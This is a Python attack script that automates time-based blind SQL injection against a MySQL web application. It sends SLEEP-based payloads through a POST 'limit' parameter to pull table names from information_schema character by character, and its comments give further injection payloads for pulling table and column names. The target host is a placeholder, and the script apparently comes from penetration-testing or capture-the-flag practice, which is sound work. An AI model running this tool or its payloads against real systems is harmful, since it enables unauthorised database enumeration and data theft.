#!/usr/bin/python3
# ? I wonder if you can use mysql cases to try more characters at a time and speed up this process?
# 	? Perhaps multithreading as well?

import requests
import time
def main():

		# I should've mentioned in my comments that requests AUTOMATICALLY URL ENCODES, SO THERE WAS NO NEED TO DUMP URL-ENCODED PAYLOADS IN HERE.
# TABLE BRUTE FORCE PAYLOAD: 
			# ' UNION SELECT IF((substr((SELECT table_name FROM information_schema.tables WHERE table_schema != 'mysql' AND table_schema != 'information_schema' ORDER BY table_name LIMIT 1 OFFSET {OFFSET}),{hash_index},1) = char({char_index})),SLEEP(3),1) #
		# Columns payload (fixed it up using LIKE, since I figured the spaces at the end of some of them would fuck things up:

			# ' UNION SELECT IF((substr((SELECT column_name FROM information_schema.columns WHERE table_schema != 'mysql' AND table_schema != 'information_schema' AND table_name LIKE '%{TABLE}%' ORDER BY column_name LIMIT 1 OFFSET {OFFSET}),{hash_index},1) = char({char_index})),SLEEP(3),1) #

	host = 'http://[HOST]/[DIR]'
	char_index = 0
	hash_index = 1
	hash = ""
	space_counter = 0
	post_data = {
		"POST_PARAM": "CHANGEME"
	}
	# TABLE = ""
	for OFFSET in range(1, 10):
		char_index = 0
		space_counter = 0
		if(len(hash) == 0 and OFFSET > 1):
			print("Empty result, quitting!")
			break
		hash = ""
		hash_index = 1
		print(f"OFFSET: {OFFSET}")
		while(True):
			# Here, we're letting the loop run through the entire ASCII table regardless of whether or not a char was found
			# This lets the tool find at least 2 chars in most cases, as it'll run through both the uppercase and lowercase alphabets.
			# (in most cases, at least in mysql, it will match both cases.
			payload=f";(SELECT IF((substr((SELECT table_name FROM information_schema.tables WHERE table_schema != 'mysql' AND table_schema != 'information_schema' ORDER BY table_name LIMIT 1 OFFSET {OFFSET}),{hash_index},1) = char({char_index})),SLEEP(3),1))#"
			post_data["limit"] = f"100{payload}"
			r = requests.post(host, data=post_data)
			delta = int(r.elapsed.total_seconds())
			if delta >= 3:
				if (char_index >= 127):
					print("[!] Finished outside of ASCII range")
					char_index = 0
				hash += chr(char_index)
				print(f"Found a char: {chr(char_index)}({char_index})! total: " + hash)
				hash_index += 1
				if(char_index <= 32):
					print("[*] Got a bad char, might be the end!")
					space_counter += 1
					char_index = 0
				if(space_counter > 1):
					print(f"[!] Finished OFFSET {OFFSET}\nGot result: {hash} (Too many bad chars!)")
					space_counter = 0
					break
			if (char_index >= 127):
				if(len(hash) == 0):
					print("Got an empty result here!")
					break
				char_index = 0
			char_index += 1
if __name__ == '__main__':
	main()


